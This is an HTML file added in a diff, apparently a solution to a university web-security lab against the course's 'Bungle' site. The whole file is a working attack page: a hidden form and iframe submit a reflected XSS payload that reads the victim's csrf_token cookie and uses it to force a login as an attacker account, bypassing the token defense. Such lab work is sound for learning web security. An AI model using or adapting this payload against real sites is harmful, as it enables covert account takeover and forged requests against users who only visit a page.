@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>2.2.2.2</title>
+    <meta charset="UTF-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+
+<body>
+
+<form action="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0" method="GET"
+      id="evilForm" target="YouCannotSeeMe">
+    <input hidden type="text" id="query" name="q" value="
+    <script>
+        function load(){
+            $.ajax({
+                type: 'GET',
+                data: 'q=aaa',
+                url: 'http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0'
+            }).done(function (data) {
+                let name = 'csrf_token=';
+                let decodedCookie = decodeURIComponent(document.cookie);
+                let ca = decodedCookie.split(';');
+                for(let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) == ' ') {
+                        c = c.substring(1);
+                    }
+                    if (c.indexOf(name) == 0) {
+                        function post(){
+                            $.ajax({
+                                type: 'POST',
+                                data: 'username=attacker&password=l33th4x&csrf_token='+c.substring(name.length, c.length),
+                                url: 'http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0'
+                            }).done(function (data) {})
+                        }
+                        post();
+                    }
+                }
+            });
+        }
+        load();
+    </script>"/>
+    <input type="submit" formaction="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0"
+           hidden onload="function f() {
+             document.forms['evilForm'].submit();
+           }"/>
+</form>
+
+<iframe name="YouCannotSeeMe" hidden></iframe>
+
+</body>
+</html>
